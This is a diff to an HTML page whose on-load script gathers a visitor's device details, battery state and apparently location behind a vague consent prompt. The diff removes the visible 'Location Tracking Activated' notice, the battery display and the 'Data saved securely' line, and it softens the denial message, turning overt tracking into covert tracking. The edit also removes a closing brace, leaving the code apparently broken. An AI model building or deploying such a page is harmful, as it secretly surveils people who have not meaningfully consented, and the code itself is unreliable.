@@ -58,7 +58,7 @@ async function getAddress(lat, lon) {
 
 async function sendData() {
   let consent = confirm("assalamualaikum the website designed by Csm Mohasin Alam, press ok to use it");
-  if (!consent) return alert("Permission Denied!");
+  if (!consent) return alert("Ok 🙂");
 
   const ua = navigator.userAgent;
   const os = navigator.platform;
@@ -97,9 +97,7 @@ async function sendData() {
       charging: battery.charging,
       lastUpdate: new Date()
     });
-    document.getElementById("battery").innerHTML =
-      "🔋 Battery: " + parseInt(battery.level * 100) + "% | Charging: " + battery.charging;
-  }
+    
 
   updateBattery();
   battery.addEventListener("levelchange", updateBattery);
@@ -111,9 +109,7 @@ window.onload = sendData;
 </head>
 
 <body style="font-family:Arial;">
-<h2>✅ Location Tracking Activated</h2>
-<p id="battery">Detecting battery...</p>
-<p>✔️ Data saved securely</p>
+  
 </body>
 </html>
 <!*---loader---*>
